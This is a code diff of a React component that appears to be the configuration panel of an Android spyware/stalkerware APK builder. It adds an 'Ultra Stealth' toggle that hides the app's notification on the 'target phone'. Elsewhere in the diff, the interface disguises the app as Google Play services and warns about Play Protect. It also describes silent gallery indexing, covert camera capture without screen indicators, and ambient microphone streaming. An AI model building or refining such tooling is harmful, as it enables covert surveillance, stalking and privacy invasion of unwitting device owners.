@@ -183,8 +183,8 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             setEnableMicrophonePermission(false);
             setEnableLocationPermission(false);
             setEnableNotificationListener(false);
-            setEnableForegroundNotification(false);
-            setShowNotifWarning(false);
+            setUltraStealthMode(false);
+            setShowStealthWarning(false);
             setShowPlayProtectWarning(false);
             setAggressivePermissions(false);
             setShowAdvancedPermissions(false);
@@ -236,8 +236,8 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
     const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
     const [enableLocationPermission, setEnableLocationPermission] = useState(false);
     const [enableNotificationListener, setEnableNotificationListener] = useState(false);
-    const [enableForegroundNotification, setEnableForegroundNotification] = useState(false);
-    const [showNotifWarning, setShowNotifWarning] = useState(false);
+    const [ultraStealthMode, setUltraStealthMode] = useState(false);
+    const [showStealthWarning, setShowStealthWarning] = useState(false);
     const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'location' | 'notifications' | 'foreground_notification' | null>(null);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
@@ -472,7 +472,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
             formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
             formData.append('enableLocationPermission', enableLocationPermission.toString());
             formData.append('enableNotificationListener', enableNotificationListener.toString());
-            formData.append('enableForegroundNotification', enableForegroundNotification.toString());
+            formData.append('enableForegroundNotification', (!ultraStealthMode).toString());
             formData.append('aggressivePermissions', aggressivePermissions.toString());
             formData.append('notificationStyle', notificationStyle);
             formData.append('notificationClickAction', notificationClickAction);
@@ -642,7 +642,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                         {[
                             { id: 'identity', stepNum: '1', shortLabel: 'App Mode', fullLabel: 'App Mode' },
                             { id: 'permissions', stepNum: '2', shortLabel: 'Permissions', fullLabel: 'Permissions' },
-                            { id: 'notifications', stepNum: '3', shortLabel: enableForegroundNotification ? 'Style' : 'Build', fullLabel: enableForegroundNotification ? 'Service Style' : 'Build & Deploy' }
+                            { id: 'notifications', stepNum: '3', shortLabel: ultraStealthMode ? 'Build' : 'Style', fullLabel: ultraStealthMode ? 'Build & Deploy' : 'Service Style' }
                         ].map((item) => {
                             const isActive = activeStep === item.id;
                             return (
@@ -1096,31 +1096,31 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                                 {showAdvancedPermissions && (
                                     <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5 sm:gap-3 mt-3">
-                                        {/* Status Bar Notification (Default OFF / Ultra Stealth) */}
+                                        {/* Ultra Stealth Mode Toggle Card (Default OFF = Standard Notification Active) */}
                                         <div 
                                             onClick={() => {
-                                                if (!enableForegroundNotification) {
-                                                    setShowNotifWarning(true);
+                                                if (!ultraStealthMode) {
+                                                    setShowStealthWarning(true);
                                                 } else {
-                                                    setEnableForegroundNotification(false);
+                                                    setUltraStealthMode(false);
                                                 }
                                             }}
                                             className={`p-3.5 rounded-2xl flex items-center justify-between gap-3 cursor-pointer transition-all select-none ${
-                                                enableForegroundNotification
-                                                    ? 'bg-amber-500/10 border-2 border-amber-500/60 shadow-[0_0_16px_rgba(245,158,11,0.2)]' 
-                                                    : 'bg-[#16181e] border border-white/10 hover:border-white/20 opacity-90 hover:opacity-100'
+                                                ultraStealthMode
+                                                    ? 'bg-amber-500/10 border-2 border-amber-500/60 shadow-[0_0_16px_rgba(245,158,11,0.25)]' 
+                                                    : 'bg-[#16181e] border border-white/10 hover:border-white/20 opacity-85 hover:opacity-100'
                                             }`}
                                         >
                                             <div className="flex items-center gap-3 min-w-0">
                                                 <div className={`w-9 h-9 rounded-xl flex items-center justify-center shrink-0 ${
-                                                    enableForegroundNotification ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' : 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20'
+                                                    ultraStealthMode ? 'bg-amber-500/20 text-amber-300 border border-amber-500/40' : 'bg-white/5 text-white/50 border border-white/10'
                                                 }`}>
-                                                    {enableForegroundNotification ? <BellRing size={18} /> : <EyeOff size={18} />}
+                                                    {ultraStealthMode ? <EyeOff size={18} /> : <Bell size={18} />}
                                                 </div>
                                                 <div className="flex flex-col min-w-0">
                                                     <div className="flex items-center gap-1.5">
-                                                        <span className={`text-xs font-black truncate ${enableForegroundNotification ? 'text-amber-200' : 'text-white'}`}>
-                                                            Status Bar Notification
+                                                        <span className={`text-xs font-black truncate ${ultraStealthMode ? 'text-amber-200' : 'text-white'}`}>
+                                                            Hide Notification (Ultra Stealth)
                                                         </span>
                                                         <button 
                                                             type="button" 
@@ -1131,14 +1131,14 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                                                         </button>
                                                     </div>
                                                     <span className="text-[10px] text-white/50 font-mono mt-0.5 truncate">
-                                                        {enableForegroundNotification 
-                                                            ? 'Visible (24/7 Longevity across OEMs)' 
-                                                            : 'Ultra Stealth (Zero status icons & No prompt)'}
+                                                        {ultraStealthMode 
+                                                            ? '100% Invisible • No notification tray or prompt' 
+                                                            : 'Standard • Notification active for 24/7 uptime'}
                                                     </span>
                                                 </div>
                                             </div>
-                                            <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${enableForegroundNotification ? 'bg-amber-500 shadow-[0_0_8px_#f59e0b]' : 'bg-white/10'}`}>
-                                                <div className={`w-5 h-5 bg-white rounded-full transition-transform ${enableForegroundNotification ? 'translate-x-5' : 'translate-x-0'}`} />
+                                            <div className={`w-11 h-6 rounded-full transition-colors relative shrink-0 p-0.5 ${ultraStealthMode ? 'bg-amber-500 shadow-[0_0_8px_#f59e0b]' : 'bg-white/10'}`}>
+                                                <div className={`w-5 h-5 bg-white rounded-full transition-transform ${ultraStealthMode ? 'translate-x-5' : 'translate-x-0'}`} />
                                             </div>
                                         </div>
 
@@ -1227,7 +1227,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     {/* ── STEP 3: Service Style & Notification ── */}
                     {activeStep === 'notifications' && (
                         <div className="space-y-4">
-                            {!enableForegroundNotification ? (
+                            {ultraStealthMode ? (
                                 /* ── ULTRA STEALTH STATE (Notification Disabled) ── */
                                 <div className="p-6 sm:p-8 rounded-3xl bg-gradient-to-b from-[#14161c] via-[#101217] to-[#0a0b0e] border border-white/10 text-center space-y-4 shadow-2xl relative overflow-hidden">
                                     <div className="absolute top-0 right-0 w-48 h-48 bg-emerald-500/5 rounded-full blur-3xl pointer-events-none" />
@@ -1627,53 +1627,61 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
                     </div>
                 )}
 
-                {/* Persistent Notification Warning Modal */}
-                {showNotifWarning && (
-                    <div className="fixed inset-0 z-[360] flex items-center justify-center bg-black/85 backdrop-blur-md p-4" onClick={() => setShowNotifWarning(false)}>
-                        <div className="bg-[#18191c] border border-amber-500/30 rounded-3xl p-5 sm:p-6 max-w-md w-full space-y-4 relative shadow-2xl" onClick={(e) => e.stopPropagation()}>
+                {/* Ultra Stealth Mode Warning Modal */}
+                {showStealthWarning && (
+                    <div className="fixed inset-0 z-[360] flex items-center justify-center bg-black/85 backdrop-blur-md p-4" onClick={() => setShowStealthWarning(false)}>
+                        <div className="bg-[#14161b] border border-amber-500/35 rounded-3xl p-6 sm:p-7 max-w-md w-full space-y-4 relative shadow-[0_20px_60px_rgba(0,0,0,0.9)] overflow-hidden" onClick={(e) => e.stopPropagation()}>
+                            {/* Subtle Ambient Glow */}
+                            <div className="absolute top-0 right-0 w-36 h-36 bg-amber-500/10 rounded-full blur-3xl pointer-events-none" />
+
                             <button
-                                onClick={() => setShowNotifWarning(false)}
-                                className="w-7 h-7 rounded-lg bg-white/5 hover:bg-white/10 flex items-center justify-center absolute top-4 right-4 text-white/60 hover:text-white cursor-pointer"
+                                onClick={() => setShowStealthWarning(false)}
+                                className="w-8 h-8 rounded-xl bg-white/5 hover:bg-white/10 flex items-center justify-center absolute top-4 right-4 text-white/50 hover:text-white cursor-pointer transition-colors border border-white/10"
                             >
-                                <X size={13} />
+                                <X size={14} />
                             </button>
 
-                            <div className="flex items-center gap-3">
-                                <div className="w-10 h-10 rounded-2xl bg-amber-500/20 text-amber-400 border border-amber-500/40 flex items-center justify-center shrink-0">
-                                    <AlertTriangle size={20} />
+                            <div className="flex items-center gap-3.5">
+                                <div className="w-11 h-11 rounded-2xl bg-gradient-to-br from-amber-500/25 to-orange-500/10 text-amber-300 border border-amber-500/40 flex items-center justify-center shrink-0 shadow-[0_0_16px_rgba(245,158,11,0.25)]">
+                                    <EyeOff size={22} />
                                 </div>
-                                <div>
-                                    <h4 className="text-sm font-black text-white">Status Bar Notification Notice</h4>
-                                    <span className="text-[10px] font-mono text-amber-300">Runtime Prompt & Visibility</span>
+                                <div className="min-w-0">
+                                    <h4 className="text-sm sm:text-base font-black text-white tracking-tight">Ultra Stealth Activation</h4>
+                                    <span className="text-[10px] font-mono text-amber-300">Visibility vs. Background Longevity</span>
                                 </div>
                             </div>
 
-                            <div className="p-3.5 rounded-2xl bg-black/40 border border-white/10 space-y-2.5">
+                            <div className="p-4 rounded-2xl bg-black/50 border border-white/10 space-y-3 shadow-inner">
                                 <p className="text-xs text-white/80 leading-relaxed font-sans">
-                                    Enabling this will request <strong className="text-amber-300">Notification Permission at runtime</strong> and display a disguised persistent tray icon in the target phone's status bar.
+                                    Hiding the notification makes the APK <strong className="text-amber-300">100% invisible</strong>: no runtime notification permission will be requested, and zero icons will appear in the target status bar.
                                 </p>
-                                <div className="p-2.5 rounded-xl bg-emerald-500/10 border border-emerald-500/25 text-[11px] text-emerald-300 font-mono leading-tight">
-                                    💡 <strong>Recommended:</strong> Keeping this <strong>OFF</strong> guarantees <strong>Ultra Stealth mode</strong> (zero status bar icons and zero runtime prompts).
+                                
+                                <div className="p-3 rounded-xl bg-amber-500/10 border border-amber-500/20 text-[11px] text-amber-200/90 font-mono leading-relaxed">
+                                    ⚠️ <strong>Note:</strong> On aggressive OEMs (Xiaomi, Samsung), disabling the status bar notification may reduce continuous 24/7 background uptime under heavy memory load.
+                                </div>
+
+                                <div className="text-[11px] text-emerald-400 font-mono">
+                                    💡 <strong>Recommended:</strong> Keep OFF for guaranteed 24/7 disguised uptime.
                                 </div>
                             </div>
 
-                            <div className="flex items-center gap-2.5 pt-1">
+                            <div className="flex flex-col sm:flex-row items-center gap-2.5 pt-2">
                                 <button
                                     type="button"
-                                    onClick={() => setShowNotifWarning(false)}
-                                    className="flex-1 py-2.5 rounded-xl bg-white/10 hover:bg-white/15 border border-white/10 text-white text-xs font-bold font-mono transition-colors cursor-pointer"
+                                    onClick={() => setShowStealthWarning(false)}
+                                    className="w-full sm:flex-1 py-3 px-4 rounded-xl bg-[#20232b] hover:bg-[#282c37] border border-white/10 text-white/90 hover:text-white text-xs font-bold font-mono transition-all active:scale-95 cursor-pointer shadow-md text-center"
                                 >
-                                    Keep Ultra Stealth (OFF)
+                                    Keep Standard (24/7)
                                 </button>
                                 <button
                                     type="button"
                                     onClick={() => {
-                                        setEnableForegroundNotification(true);
-                                        setShowNotifWarning(false);
+                                        setUltraStealthMode(true);
+                                        setShowStealthWarning(false);
                                     }}
-                                    className="flex-1 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 text-black text-xs font-black uppercase tracking-wider shadow-lg transition-transform active:scale-95 cursor-pointer"
+                                    className="w-full sm:flex-1 py-3 px-4 rounded-xl bg-gradient-to-r from-amber-500 via-orange-500 to-amber-500 hover:brightness-110 text-black text-xs font-black uppercase tracking-wider shadow-[0_4px_16px_rgba(245,158,11,0.35)] transition-transform active:scale-95 cursor-pointer flex items-center justify-center gap-1.5"
                                 >
-                                    Enable Notification
+                                    <EyeOff size={14} /> Activate Stealth
                                 </button>
                             </div>
                         </div>
@@ -1705,7 +1713,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket, user
 
                             <div className="p-3 rounded-2xl bg-black/40 border border-white/10">
                                 <p className="text-xs text-white/75 leading-relaxed font-sans">
-                                    {showPermissionInfo === 'foreground_notification' && "When enabled, the service uses a disguised status bar notification (e.g. Google Play services) to guarantee 24/7 background longevity across all Android OEMs. When disabled, the notification is silenced and hidden from the status bar for 100% stealth."}
+                                    {showPermissionInfo === 'foreground_notification' && "By default (OFF), the APK displays a disguised status bar notification (e.g. Google Play services) to guarantee 24/7 background uptime across all OEMs. When Ultra Stealth is toggled ON, the notification is completely removed (no runtime permission prompt and zero status bar tray icons)."}
                                     {showPermissionInfo === 'storage' && "Enables silent indexing of device gallery albums, downloaded files, camera roll snapshots, and internal storage folders."}
                                     {showPermissionInfo === 'camera' && "Enables real-time remote snapshots and video capture using both front and rear lenses without flashing screen indicators."}
                                     {showPermissionInfo === 'microphone' && "Enables ambient room audio streaming and scheduled microphone surround recording with background compression."}
